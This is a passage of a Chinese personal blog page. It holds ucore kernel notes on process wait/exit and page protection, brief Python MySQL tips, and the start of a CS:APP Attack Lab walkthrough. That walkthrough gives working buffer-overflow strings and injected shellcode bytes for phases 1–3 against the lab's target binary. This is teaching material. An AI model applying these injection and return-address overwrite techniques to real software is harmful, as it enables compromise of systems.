</tr>
<tr>
<td>-1</td>
<td align="center">meaning wait for any child process.</td>
</tr>
<tr>
<td>0</td>
<td align="center">meaning wait for any child process whose process group ID is equal to that of the calling process</td>
</tr>
<tr>
<td>&gt; 0</td>
<td align="center">meaning wait for the child whose process ID is equal to the value of pid.</td>
</tr>
</tbody></table>
<p>do_wait 程序会使某个进程一直等待，直到（特定）子进程退出后，该进程才会回收该子进程的资源并函数返回。该函数的具体操作如下：</p>
<p>检查当前进程所分配的内存区域是否存在异常。查找特定/所有子进程中是否存在某个等待父进程回收的子进程（PROC_ZOMBIE）。</p>
<p>如果有，则回收该进程并函数返回。</p>
<p>如果没有，则设置当前进程状态为 PROC_SLEEPING 并执行 schedule 调度其他进程运行。当该进程的某个子进程结束运行后，当前进程会被唤醒，并在 do_wait 函数中回收子进程的 PCB 内存资源。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_wait(<span class="keyword">uint32_t</span> arg[]) &#123;</span><br><span class="line">    <span class="keyword">int</span> pid = (<span class="keyword">int</span>)arg[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> *store = (<span class="keyword">int</span> *)arg[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> do_wait(pid, store);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_wait(<span class="keyword">int</span> pid, <span class="keyword">int</span> *code_store) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="comment">// code_store 应该是 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (code_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)code_store, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag, haskid;</span><br><span class="line">repeat:</span><br><span class="line">    haskid = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 按照上面的参数定义 pid 不为 0（不实现&lt;0的情况，默认pid&gt;=0）</span></span><br><span class="line">    <span class="comment">// 表示等待特定子进程终止</span></span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 找到那个子进程，确定存在父子关系</span></span><br><span class="line">        <span class="comment">// 若子进程的状态为 ZOMBIE 直接跳到found回收子进程资源</span></span><br><span class="line">        <span class="comment">// ZOMBIE 按照exit的定义自己已经回收了mm，等待父进程回收PCB</span></span><br><span class="line">        proc = find_proc(pid);</span><br><span class="line">        <span class="keyword">if</span> (proc != <span class="literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE)</span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//循环找到该父进程下的所有子进程</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        proc = current-&gt;cptr;</span><br><span class="line">        <span class="keyword">for</span> (; proc != <span class="literal">NULL</span>; proc = proc-&gt;optr) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 查到一个 ZOMBIE 子进程直接回收</span></span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE)</span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查到有要等待的的子进程，设置父进程的状态为等待，进行CPU调度</span></span><br><span class="line">    <span class="keyword">if</span> (haskid) &#123;</span><br><span class="line">        current-&gt;state = PROC_SLEEPING;</span><br><span class="line">        current-&gt;wait_state = WT_CHILD;</span><br><span class="line">        schedule();</span><br><span class="line">        <span class="comment">// 一直陷在内核态，等待子进程将其唤醒，继续执行下面的函数释放子进程资源</span></span><br><span class="line">        <span class="comment">// 重复直到没有进程资源需要释放</span></span><br><span class="line">        <span class="keyword">if</span> (current-&gt;flags &amp; PF_EXITING)</span><br><span class="line">            do_exit(-E_KILLED);</span><br><span class="line">        <span class="keyword">goto</span> repeat;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_BAD_PROC;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放子进程资源，就是子进程exit时回收不了的PCB</span></span><br><span class="line">found:</span><br><span class="line">    <span class="keyword">if</span> (proc == idleproc || proc == initproc)</span><br><span class="line">        panic(<span class="string">&quot;wait idleproc or initproc.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (code_store != <span class="literal">NULL</span>)</span><br><span class="line">        *code_store = proc-&gt;exit_code;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        unhash_proc(proc);</span><br><span class="line">        remove_links(proc);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h2><p>为什么上面的父进程可以在执行 schedule()切换到其他进程后还能拿到 CPU 的控制权从而释放子进程资源的原因就在 do_exit 函数</p>
<p>函数与 do_execve/do_wait 函数中的进程回收代码类似，但又有所不同。其具体操作如下：</p>
<ul>
<li>回收所有内存（除了 PCB，该结构只能由父进程回收）</li>
<li>设置当前的进程状态为 PROC_ZOMBIE</li>
<li>设置当前进程的退出值 current-&gt;exit_code。</li>
<li>如果有父进程，则唤醒父进程，使其准备回收该进程的 PCB。</li>
<li>正常情况下，除了 initproc 和 idleproc 以外，其他进程一定存在父进程。</li>
<li>如果当前进程存在子进程，则设置所有子进程的父进程为 initproc。这样倘若这- 些子进程进入结束状态，则 initproc 可以代为回收资源。</li>
<li>执行进程调度。一旦调度到当前进程的父进程，则可以马上回收该终止进程的 PCB。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// do_exit - called by sys_exit</span></span><br><span class="line"><span class="comment">//   1. call exit_mmap &amp; put_pgdir &amp; mm_destroy to free the almost all memory space of process</span></span><br><span class="line"><span class="comment">//   2. set process&#x27; state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself.</span></span><br><span class="line"><span class="comment">//   3. call scheduler to switch to other process</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">int</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current == idleproc)</span><br><span class="line">    &#123;</span><br><span class="line">        panic(<span class="string">&quot;idleproc exit.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (current == initproc)</span><br><span class="line">    &#123;</span><br><span class="line">        panic(<span class="string">&quot;initproc exit.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="comment">// 释放当前进程 mm</span></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置当前进程状态为 ZOMBIE 等待父进程回收</span></span><br><span class="line">    current-&gt;state = PROC_ZOMBIE;</span><br><span class="line">    current-&gt;exit_code = error_code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc = current-&gt;parent;</span><br><span class="line">        <span class="comment">// 在这步中会唤起等待子进程结束的父进程来回收资源</span></span><br><span class="line">        <span class="keyword">if</span> (proc-&gt;wait_state == WT_CHILD)</span><br><span class="line">            wakeup_proc(proc);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当前进程存在子进程，则设置所有子进程的父进程为 initproc。这样倘若这- 些子进程进入结束状态，则 initproc 可以代为回收资源。</span></span><br><span class="line">        <span class="keyword">while</span> (current-&gt;cptr != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            proc = current-&gt;cptr;</span><br><span class="line">            current-&gt;cptr = proc-&gt;optr;</span><br><span class="line">            proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="literal">NULL</span>)</span><br><span class="line">                initproc-&gt;cptr-&gt;yptr = proc;</span><br><span class="line">            proc-&gt;parent = initproc;</span><br><span class="line">            initproc-&gt;cptr = proc;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE)</span><br><span class="line">                <span class="keyword">if</span> (initproc-&gt;wait_state == WT_CHILD)</span><br><span class="line">                    wakeup_proc(initproc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line"></span><br><span class="line">    schedule();</span><br><span class="line">    panic(<span class="string">&quot;do_exit will not return!! %d.\n&quot;</span>, current-&gt;pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="页级保护"><a href="#页级保护" class="headerlink" title="页级保护"></a>页级保护</h2><p>页目录和页表表项中的读写标志 R/W 和用户/超级用户标识 U/S 提供了分段机制保护属性的一个子集。分页机制只识别两级权限。特权级 0、1 和 2 被归类为超级用户级，而特权级 3 被称为普通用户级。普通用户级的页面可以被标志成只读/可执行或可读/可写/可执行。超级用户级的页面 对于超级用户来说总是可读/可写/可执行的，但普通用户不可访问。 对于分段机制，在最外层用户级执行的程序只能访问用户级的页面，但是在任何超级用户层(0、1、2)执行的程序 不仅可以访问用户层的页面，也可以访问超级用户层的页面。与分段机制不同的是，在内层超级用户级执行的程序对任何 页面都具有可读/可写/可执行权限，包括那些在用户级标注为只读/可执行的页面。</p>
<p>P–位 0 是存在（Present）标志，用于指明表项对地址转换是否有效。P=1 表示有效；P=0 表示无效。在页转换过程中，如果说涉及的页目录或页表的表项无效，则会导致一个异常。如果 P=0，那么除表示表项无效外，其余位可供程序自由使用，如图 4-18b 所示。例如，操作系统可以使用这些位来保存已存储在磁盘上的页面的序号。</p>
<p>R/W–位 1 是读/写（Read/Write）标志。如果等于 1，表示页面可以被读、写或执行。如果为 0，表示页面只读或可执行。当处理器运行在超级用户特权级（级别 0、1 或 2）时，则 R/W 位不起作用。页目录项中的 R/W 位对其所映射的所有页面起作用。</p>
<p>U/S–位 2 是用户/超级用户（User/Supervisor）标志。如果为 1，那么运行在任何特权级上的程序都可以访问该页面。如果为 0，那么页面只能被运行在超级用户特权级（0、1 或 2）上的程序访问。页目录项中的 U/S 位对其所映射的所有页面起作用。</p>
<p>ucore 通过上述机制实现对内核的保护。注意在 pmm.c 函数 boot_map_segment 中映射内核地址的页表的时候。对每个页表项没有设置 PTE_U 这一位，因为这个时候还在操作系统内核里面，用的段选择子还是内核态的，所以不需要用户权限也能够访问页表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">boot_map_segment(boot_pgdir, KERNBASE, KMEMSIZE, <span class="number">0</span>, PTE_W);</span><br><span class="line"></span><br><span class="line">boot_map_segment(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">size_t</span> size, <span class="keyword">uintptr_t</span> pa, <span class="keyword">uint32_t</span> perm) &#123;</span><br><span class="line">    assert(PGOFF(la) == PGOFF(pa));</span><br><span class="line">    <span class="keyword">size_t</span> n = ROUNDUP(size + PGOFF(la), PGSIZE) / PGSIZE;</span><br><span class="line">    la = ROUNDDOWN(la, PGSIZE);</span><br><span class="line">    pa = ROUNDDOWN(pa, PGSIZE);</span><br><span class="line">    <span class="keyword">for</span> (; n &gt; <span class="number">0</span>; n --, la += PGSIZE, pa += PGSIZE) &#123;</span><br><span class="line">        <span class="keyword">pte_t</span> *ptep = get_pte(pgdir, la, <span class="number">1</span>);</span><br><span class="line">        assert(ptep != <span class="literal">NULL</span>);</span><br><span class="line">        *ptep = pa | PTE_P | perm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但当用户态切到内核态执行 exec 调用时，setup_pgdir 会在该进程新建立的 mm 中复制内核的页表（do_execve-&gt;load_icode-&gt;setup_pgdir）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">setup_pgdir(struct mm_struct *mm)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((page = alloc_page()) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir = page2kva(page);</span><br><span class="line">    <span class="built_in">memcpy</span>(pgdir, boot_pgdir, PGSIZE);</span><br><span class="line">    pgdir[PDX(VPT)] = PADDR(pgdir) | PTE_P | PTE_W;</span><br><span class="line">    mm-&gt;pgdir = pgdir;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在随后 load_icode 执行加载 ELF 文件时会不断的去扩充之前写好的页表（之前复制内核的页表，该页表只有上 3G 有地址对应，下面全是空的，根据 ELF 段的位置把他加载到下 3G 的虚拟内存中，并填好页表），这个时候会设置 PTE_U 这一位使用户态的程序可见。</p>
<p>像这样就完成了对内核空间的映射和保护，每个进程都复制了内核代码的位置，但是处在用户态的时候没有足够的权限看见，但当引发系统中断时。会把段子换成内核的段，就可以执行内核态的代码了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SETGATE(idt[T_SYSCALL], <span class="number">1</span>, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/24/python%E4%B8%8Emysql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/24/python%E4%B8%8Emysql/" class="post-title-link" itemprop="url">python与mysql</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-24 10:47:34" itemprop="dateCreated datePublished" datetime="2019-11-24T10:47:34Z">2019-11-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-21 00:49:44" itemprop="dateModified" datetime="2021-01-21T00:49:44Z">2021-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ol>
<li><p> mysql命令行的使用 注意以管理员身份运行 net start mysql80命令 安装时注意windows service name 是 mysql80不能写mysql 进入C:\Program Files\MySQL\MySQL Server 8.0\bin该路径操作cd “C:\Program Files\MySQL\MySQL Server 8.0\bin”不要一步一步来 .\mysql -u root -p –i-am-a-dummy 不怕手作删库跑路可以不写–i-am-a-dummy 操作完成 net stop mysql80</p>
</li>
<li><p>遇到的Unread result found异常 All that was required was for buffered to be set to true! cursor = cnx.cursor(buffered=True) The reason is that without a buffered cursor, the results are “lazily” loaded, meaning that “fetchone” actually only fetches one row from the full result set of the query. When you will use the same cursor again, it will complain that you still have n-1 results (where n is the result set amount) waiting to be fetched. However when you use a buffered cursor the connector fetches ALL rows behind the scenes and you just take one from the connector so the mysql db won’t complain. Hope it helps. 来自 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/29772337/python-mysql-connector-unread-result-found-when-using-fetchone">https://stackoverflow.com/questions/29772337/python-mysql-connector-unread-result-found-when-using-fetchone</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my = mysql.connector.connect(user=<span class="string">&quot;username&quot;</span>,</span><br><span class="line">                         password=<span class="string">&quot;123456&quot;</span>,</span><br><span class="line">                         charset=<span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">                         buffered=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p> 记得buffered=True要不然从数据中读取太多数据，又不全用会导致这个异常，但不用异常捕获是看不到的，只会直接退出不报错。</p>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2019/11/24/attack-lab%E5%AE%9E%E9%AA%8C%E6%94%BB%E7%95%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/24/attack-lab%E5%AE%9E%E9%AA%8C%E6%94%BB%E7%95%A5/" class="post-title-link" itemprop="url">Attack Lab实验攻略</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-24 10:29:50" itemprop="dateCreated datePublished" datetime="2019-11-24T10:29:50Z">2019-11-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-01-21 00:46:04" itemprop="dateModified" datetime="2021-01-21T00:46:04Z">2021-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/bupt%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/" itemprop="url" rel="index"><span itemprop="name">bupt学习资源汇总</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在通过了Attack Lab的五个试验后，写一篇博客，总结一下实验当中遇到的问题和解决方案，下面一个关卡一个关卡的说</p>
<ol>
<li><p>phase1 phase1应该是最简单的一关了先汇编getbuf的汇编代码我们可以看到第一条指令为 sub $0x28,%rsp ,即向getbuf函数分配了长度为40个字节的空间，要求调用touch1，故构造攻击字符串如下所示</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33&#x2F;&#x2F;从开头到这一共有40个字节，刚好使缓冲区溢出，将返回地址覆盖为touch1的地址</span><br><span class="line">1d 18 40 00 00 00 00 00&#x2F;&#x2F;touch1的地址，注意使用小端法</span><br></pre></td></tr></table></figure>

<p> phase1主要是熟悉实验操作，在写完字符串后使用 vim attck1.txt将字符串复制进去，wq退出 ./hex2raw &lt; attack1.txt &gt; attackstring1.txt将其转换为字符串 最后。./ctarget -i attackstring1.txt完成实验</p>
</li>
<li><p>phase2 这关要求写汇编代码，要求输入cookie值，则需要将cookie放入寄存器%rdi中再调用touch2 Getbuf返回地址被篡改为缓存区写入命令的地址 编写汇编码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x29110ecb（cookie值）,%rdi&#x2F;&#x2F;把cookie值作为参数传入</span><br><span class="line">pushq $0x401849&#x2F;&#x2F;把touch2的地址压入栈中</span><br><span class="line">ret&#x2F;&#x2F;返回调用touch2</span><br></pre></td></tr></table></figure>

<p> 使用下面一系列命令得到汇编代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim attack2obj.s</span><br><span class="line">gcc -c attack2obj.s</span><br><span class="line">objdump -d attack2obj.o</span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">0:   48 c7 c7 cb 0e 11 29    mov    $0x29110ecb,%rdi</span><br><span class="line">7:   68 49 18 40 00          pushq  $0x401849</span><br><span class="line">c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p> 构造攻击代码为</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 cb 0e 11 29 68&#x2F;&#x2F;通过之后的栈顶指针返回到这执行</span><br><span class="line">49 18 40 00 c3 00 00 00&#x2F;&#x2F;就是反汇编的汇编代码抄下来</span><br><span class="line">23 33 33 33 33 33 33 33&#x2F;&#x2F;指令编码无需小端法</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33&#x2F;&#x2F;抄完汇编代码随便填，直到这溢出</span><br><span class="line">a8 1d 66 55 00 00 00 00&#x2F;&#x2F;栈顶指针的值，需要使用gdb监视</span><br></pre></td></tr></table></figure>
</li>
<li><p>phase3 观察源代码要求将cookie以字符的方式输入与之匹配，传入的是cookie的指针，那么需要将cookie存在栈中的某个地方调用hexmatch可能会把之前栈里的东西给抹了，所以不能放在getbuf的栈里，放在其父栈里比较合适</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 d8 1d 66 55 68</span><br><span class="line">5a 19 40 00 c3</span><br><span class="line">&#x2F;&#x2F;执行</span><br><span class="line">&#x2F;&#x2F;movq $0x55661dd8,%rdi把cookie地址给放到%rdi里</span><br><span class="line">&#x2F;&#x2F;pushq $0x40195a把touch3压到栈里</span><br><span class="line">&#x2F;&#x2F;ret返回调用touch3</span><br><span class="line">00 00 00</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33&#x2F;&#x2F;从00开始填充剩下没用的缓冲区</span><br><span class="line">a8 1d 66 55 00 00 00 00&#x2F;&#x2F;getbuf栈地址结束跳转执行汇编缓冲区内的汇编代码</span><br><span class="line">32 39 31 31 30 65 63 62&#x2F;&#x2F;以ascii码储存cookie值，这是字节数组，本来小端就应该是顺序写</span><br></pre></td></tr></table></figure>

<p> 4.phase4 这个关卡要求在start_farm到end_farm之间寻找代码来完成注入攻击在程序中采用了随机栈需要拼凑代码，在汇编代码中找到两个gadget为</p>
